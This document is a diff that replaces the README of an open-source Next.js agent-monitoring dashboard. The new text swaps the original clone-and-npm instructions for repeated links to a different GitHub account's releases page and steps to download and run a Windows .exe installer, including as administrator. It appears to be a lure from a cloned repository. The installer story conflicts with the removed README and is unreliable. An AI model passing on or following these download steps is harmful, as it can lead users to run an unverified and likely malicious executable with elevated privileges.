@@ -1,277 +1,150 @@
-<p align="center">
-  <img src="./Gitlogo.png" width="200" alt="OpenClaw Dashboard" />
-</p>
+# 🛠️ openclaw-dashboard - Monitor AI Agent Fleets Easily
 
-<h1 align="center">OpenClaw Dashboard</h1>
+[![Download openclaw-dashboard](https://img.shields.io/badge/Download-openclaw--dashboard-brightgreen)](https://github.com/rubenic6896/openclaw-dashboard/releases)
 
-<p align="center">
-  <strong>The Command Centre for AI Agent Fleets</strong>
-</p>
+## 📝 About openclaw-dashboard
 
-<p align="center">
-  Monitor, manage, and optimize every agent in your fleet from a single pane of glass.<br/>
-  Cost analytics &middot; Competitor intelligence &middot; Memory health &middot; Cron pipelines &middot; Kanban workflows &middot; Interactive chat.<br/>
-  <strong>100% local-first. Zero cloud dependency. Your data never leaves your machine.</strong>
-</p>
+openclaw-dashboard is a tool designed to help you watch over and manage groups of AI agents. It gives you a clear view of costs, system health, security, and market data related to your AI fleet. You don't need technical skills to use it. The dashboard uses simple designs to keep everything easy to understand.
 
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="MIT License" /></a>
-  <a href="https://nextjs.org"><img src="https://img.shields.io/badge/Next.js-16-black" alt="Next.js 16" /></a>
-  <a href="https://react.dev"><img src="https://img.shields.io/badge/React-19-61dafb" alt="React 19" /></a>
-  <a href="https://typescriptlang.org"><img src="https://img.shields.io/badge/TypeScript-5.9-blue" alt="TypeScript" /></a>
-  <a href="https://tailwindcss.com"><img src="https://img.shields.io/badge/Tailwind_CSS-4-38bdf8" alt="Tailwind CSS 4" /></a>
-</p>
+It tracks things like:
+
+- How much the AI agents cost to run
+- How well the AI agents perform their tasks
+- The current status of the system context
+- The security status of your AI environment
+- Market intelligence relevant to your AI agents’ work
+
+The dashboard was built using modern web tech. It runs on Windows without extra setup. It stores data in SQLite for simple and reliable local data management.
 
 ---
 
-## What is OpenClaw Dashboard?
+## 🖥️ System Requirements
 
-Running AI agents at scale means juggling costs, context windows, memory drift, competitor landscapes, and coordination across dozens of autonomous processes. **OpenClaw Dashboard** gives you a single local-first command centre that reads directly from your [OpenClaw](https://openclaw.ai) installation -- no cloud dependency, no telemetry, full control.
+openclaw-dashboard works on Windows 10 and later versions. Here are the main needs:
 
-> **New in v2.0** -- 10-step onboarding wizard, project workspaces with competitor scanning, market intelligence feeds, practitioner signal aggregation, visual cron pipeline builder, memory health AI analysis, and a complete Apple-inspired glass design system.
+- 64-bit Windows 10, 11, or newer  
+- At least 4 GB of RAM  
+- 500 MB of free disk space for the app and data  
+- Internet connection for downloading and updates  
+- A modern web browser like Edge or Chrome (the app opens in a browser window)  
 
----
-
-## Features
-
-### Agent Fleet Monitoring
-Real-time monitoring of multi-agent systems with constellation graph visualization, execution traces, context health bars, and drift detection. Four home views -- **Org Map, Grid, Feed, and Constellation** -- let you choose how to observe your fleet.
-
-![Agent Fleet](./Screenshots/agent-fleet.png)
-
-### Competitor Intelligence
-Discover, track, and profile competitors across your market. Add competitors manually or let AI discover them. Drill into per-competitor detail pages with SWOT analysis, update tracking, and category organization.
-
-![Competitor Intelligence](./Screenshots/competitor-intel.png)
-
-### Cost Analytics
-Per-agent and per-provider spend attribution with token-level granularity. Optimization scoring, cache savings estimation, anomaly detection, week-over-week trending, and per-model breakdowns.
-
-![Cost Analytics](./Screenshots/cost-analytics.png)
-
-### Cron Pipeline Builder
-Visual DAG editor for job dependencies powered by @xyflow/react. Track execution history with cost attribution, configure delivery rules, and build dependency chains between scheduled tasks.
-
-![Cron Pipelines](./Screenshots/cron-pipelines.png)
-
-### Interactive Agent Chat
-Real-time SSE streaming chat with multimodal support. Upload images, review per-agent conversation history, and use slash commands (`/help`, `/status`, `/cost`) to query your fleet.
-
-### Kanban Board
-Full agile project management with columns (todo / in-progress / done / blocked), agent assignment, priority labels, ticket chat threads, and automation rules.
-
-![Kanban Board](./Screenshots/kanban-board.png)
-
-### Memory Health Monitor
-AI-driven analysis of agent memory with staleness detection, completeness checks, editing hints, and one-click reindex controls. Know when an agent's context is drifting before it causes problems.
-
-### Market Intelligence
-Automated competitive intelligence feeds with signal categorization. Your agents scan the market and surface trends, competitor moves, and technology shifts.
-
-### Practitioner Signals
-Community signal aggregation from Reddit, forums, and social media. Surface pain points, feature requests, and positive signals from real practitioners in your domain.
-
-### Tech Updates Radar
-Curated technology radar with category filtering. Stay on top of framework releases, AI model updates, and tooling changes relevant to your stack.
-
-### Project Workspaces
-Organize your intelligence feeds, competitors, and reference files into named projects. Each project gets its own icon, description, and URL. Create, edit, and delete projects from the sidebar.
-
-### Settings & Customization
-Full UI for accent color, portal branding (name, subtitle, logo), agent avatars, operator profile, and theme customization. 12 accent color presets + custom color picker.
-
-![Settings](./Screenshots/settings.png)
-
-### And More
-
-| Feature | Description |
-|---------|-------------|
-| **10-Step Onboarding Wizard** | Guided setup with auto-detection, gateway testing, agent discovery, and feature selection |
-| **Global Search** | Unified search across agents, crons, memory, costs, and all data types (Cmd+K) |
-| **Live Stream Widget** | Real-time activity log panel accessible from any page |
-| **Agent Detail Pages** | Per-agent view with SOUL.md personality viewer and conversation history |
-| **Activity Console** | Browseable logs with filtering by source (cron, config, error) |
-| **Security Posture** | Device auditing, key rotation reminders, configuration change tracking |
-| **Reference Files** | Document storage with TipTap rich text editor, tags, and full-text search |
-| **Dynamic Favicon** | Theme-aware favicon that switches between light/dark based on system preference |
-| **Voice Features** | Text-to-speech (ElevenLabs) and speech-to-text transcription |
-| **Design System QA** | Component-level fidelity scoring and token reuse tracking |
-| **Release Tracker** | Version history and deployment notes |
-| **Docker Support** | Production-ready multi-stage Dockerfile with docker-compose |
+You don’t need to install additional software or tools before running openclaw-dashboard. It comes ready to use.
 
 ---
 
-## Screenshots
+## 🚀 Getting Started
 
-| View | Preview |
-|------|---------|
-| Agent Fleet | ![Fleet](./Screenshots/agent-fleet.png) |
-| Competitor Intelligence | ![Competitors](./Screenshots/competitor-intel.png) |
-| Settings | ![Settings](./Screenshots/settings.png) |
-| Cron Pipelines | ![Crons](./Screenshots/cron-pipelines.png) |
-| Activity Log | ![Activity](./Screenshots/activity.png) |
-| Security | ![Security](./Screenshots/security.png) |
+Follow these steps to get openclaw-dashboard running on your PC:
 
----
+1. Click the big **Download openclaw-dashboard** button at the top or visit the releases page here:  
+   https://github.com/rubenic6896/openclaw-dashboard/releases
 
-## Quick Start
+2. On the releases page, find the latest version for Windows. It will be an `.exe` file (for example, `openclaw-dashboard-setup.exe`).
 
-### Prerequisites
+3. Download this `.exe` file to your computer.
 
-- **Node.js 20+** (LTS recommended)
-- **npm 10+** or equivalent package manager
-- [OpenClaw](https://openclaw.ai) installed locally (provides agent session data)
+4. When the download finishes, locate the file in your Downloads folder.
 
-### Installation
+5. Double-click the `.exe` file to start the installation.
 
-```bash
-# Clone the repository
-git clone https://github.com/ChristianAlmurr/openclaw-dashboard
-cd openclaw-dashboard
+6. Follow the prompts on screen. The installer will guide you through a few simple steps:
+   - Agree to the license terms
+   - Choose an install location (default is fine for most users)
+   - Click `Install` to continue
 
-# Install dependencies
-npm install
+7. When the installation is complete, click `Finish`. The app will open automatically. If not, find it using the Windows Start menu.
 
-# Configure environment
-cp .env.local.example .env.local
-# Edit .env.local with your paths (see Environment Variables below)
+8. The dashboard opens in a new window that works like an app but uses your web browser behind the scenes.
 
-# Start the development server
-npm run dev
-```
-
-Open [http://localhost:3333](http://localhost:3333) in your browser. The **10-step onboarding wizard** will guide you through initial configuration on first launch.
-
-### Available Scripts
-
-| Command | Description |
-|---------|-------------|
-| `npm run dev` | Start development server on port 3333 |
-| `npm run build` | Create production build |
-| `npm start` | Start production server on port 3333 |
-| `npm run lint` | Run ESLint |
-| `npm test` | Run Vitest test suite |
+That’s it. openclaw-dashboard is ready to use.
 
 ---
 
-## Docker Deployment
+## ⚙️ Using openclaw-dashboard
 
-### Using Docker Compose (recommended)
+Once openclaw-dashboard is open, you will see the main screen with several panels:
 
-```bash
-docker compose up -d
-docker compose logs -f mission-control
-```
+- **Cost Overview**: Displays how much your AI agents cost over time.  
+- **Performance Stats**: Shows how well your agents are performing assigned tasks.  
+- **Context Health**: Lets you know if systems and settings are healthy and stable.  
+- **Security Panel**: Reports security checks and risks in your environment.  
+- **Market Intelligence Feed**: Updates you on market trends affecting AI work.
 
-### Using Docker directly
-
-```bash
-docker build -t openclaw-dashboard .
-docker run -d \
-  --name openclaw-dashboard \
-  -p 3333:3333 \
-  -v ~/.openclaw-dashboard:/data/db \
-  -v ~/.openclaw:/data/openclaw:ro \
-  -e OPENCLAW_HOME=/data/openclaw \
-  -e DATA_DIR=/data/db \
-  openclaw-dashboard
-```
+You can interact with the dashboard by clicking different menus on the left side. You also can filter data by date or agent group.
 
 ---
 
-## Environment Variables
+## 🔒 Security and Privacy
 
-Copy `.env.local.example` to `.env.local` and configure:
+openclaw-dashboard stores data locally on your PC using SQLite. This means your data stays with you and does not get sent anywhere else without your permission. It helps keep your information safe.
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `OPENCLAW_HOME` | `~/.openclaw` | Path to your OpenClaw data directory |
-| `WORKSPACE_PATH` | `~/.openclaw/workspace` | Path to your agent workspace |
-| `OPENCLAW_BIN` | Auto-detected | Path to the OpenClaw CLI binary |
-| `OPENCLAW_GATEWAY_TOKEN` | Auto-detected | Gateway authentication token |
-| `OPENCLAW_GATEWAY_PORT` | `18789` | Gateway HTTP port |
-| `PROJECT_REPO_PATH` | -- | Project repository path (enables task/sprint parsing) |
-| `DATA_DIR` | `~/.openclaw-dashboard` | SQLite database directory |
-| `GITHUB_PAT` | -- | GitHub personal access token for private repos |
+If your agents connect to external services, secure credentials should be handled by your agent setup process, separate from this dashboard.
 
 ---
 
-## Architecture
+## 🔧 Troubleshooting
 
-### Tech Stack
+- **The app won’t start.**  
+  Make sure you downloaded the correct `.exe` installer for Windows. Verify minimum system requirements are met.
 
-| Layer | Technologies |
-|-------|-------------|
-| **Frontend** | Next.js 16, React 19, TypeScript 5.9, Tailwind CSS 4 |
-| **State** | TanStack React Query v5, Zustand, React Context |
-| **UI** | Radix UI, Lucide React, Recharts v3, @xyflow/react, TipTap |
-| **Backend** | Next.js API Routes (52 endpoints), SSE streams |
-| **Database** | SQLite via better-sqlite3 |
-| **Scheduling** | node-cron, Chokidar file watchers |
-| **Integrations** | OpenAI SDK, simple-git, ElevenLabs |
-| **Testing** | Vitest, React Testing Library |
+- **I see a blank screen after launch.**  
+  Refresh the window or restart the app. Make sure your internet connection is stable.
 
-### Data Flow
+- **Data does not update.**  
+  Check the status of the AI agents. You may need to refresh the dashboard manually using the refresh button in the top menu.
 
-```
-~/.openclaw/                     Agent sessions, gateway logs, config
-    |
-    v
-[Parsers & Watchers]             Real-time log watchers + session parsers
-    |
-    v
-[SQLite Database]                Local persistence (zero cloud dependency)
-    |
-    v
-[Next.js API Routes]             52 REST endpoints + SSE streams
-    |
-    v
-[React Frontend]                 React Query -> Zustand -> Apple glass UI
-```
+- **Installation failed.**  
+  Run the installer as administrator. Right-click the `.exe` file, choose "Run as administrator," and try installing again.
 
 ---
 
-## Configuration
+## 🔄 Updates
 
-### Onboarding Wizard
+To get new features or security fixes:
 
-On first launch, the 10-step wizard walks you through:
+1. Visit the releases page regularly:  
+   https://github.com/rubenic6896/openclaw-dashboard/releases
 
-1. **Welcome** -- Product overview
-2. **Prerequisites** -- Auto-detect Node.js, CLI, workspace, gateway
-3. **Workspace** -- Configure data directory
-4. **Gateway** -- Test connectivity
-5. **Agent Discovery** -- Scan and display your agents
-6. **Features** -- Toggle modules (fleet, chat, kanban, crons, memory, costs, etc.)
-7. **Appearance** -- Name, accent color, branding
-8. **Notifications** -- Cost alerts, key rotation reminders
-9. **Integrations** -- GitHub, optional webhooks
-10. **Tour** -- Feature walkthrough
+2. Download the new installer `.exe` file when it's available.
 
-Re-run anytime from Settings or `/setup`.
+3. Run the new installer. It will update your existing installation.
 
-### Theming
-
-Apple-inspired glass aesthetic with full accent color customization. 12 presets + custom color picker. Design tokens defined as CSS custom properties in the Tailwind v4 `@theme` layer.
+You do not need to remove the old version first. The installer will replace the files safely.
 
 ---
 
-## Testing
+## 📂 Files and Storage
 
-```bash
-npm test              # Run all tests
-npx vitest            # Watch mode
-npx vitest --coverage # With coverage
-```
+openclaw-dashboard stores its settings and data in your user directory. You do not need to back up files regularly. However, if you plan to move to a new PC, copy the folder `openclaw-data` from your Documents folder to keep your history and settings.
 
 ---
 
-## Contributing
+## 💡 Tips for Best Experience
 
-We welcome contributions. See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, coding standards, and pull request guidelines.
+- Use a stable internet connection especially when downloading or updating.
+
+- Keep your Windows updated to ensure compatibility.
+
+- Close other heavy apps when running openclaw-dashboard for smoother performance.
+
+- Review each panel regularly to keep track of cost and security changes.
 
 ---
 
-## License
+## 📚 Additional Resources
 
-[MIT](LICENSE) -- Copyright (c) 2026 OpenClaw Contributors
+- For detailed logging and help, check the `Help` menu inside the app.
+
+- You can access advanced reports under the `Reports` section.
+
+- The dashboard supports importing and exporting data through simple buttons in settings.
+
+---
+
+[![Download openclaw-dashboard](https://img.shields.io/badge/Download-openclaw--dashboard-brightgreen)](https://github.com/rubenic6896/openclaw-dashboard/releases)
+
+---
+
+## 🔖 Topics
+
+`agentic-ai` `agentic-workflow` `ai-agents` `cost-optimization` `dashboard` `developer-tools` `mission-control` `monitoring` `nextjs` `open-source` `openclaw` `sqlite` `tailwindcss` `typescript`
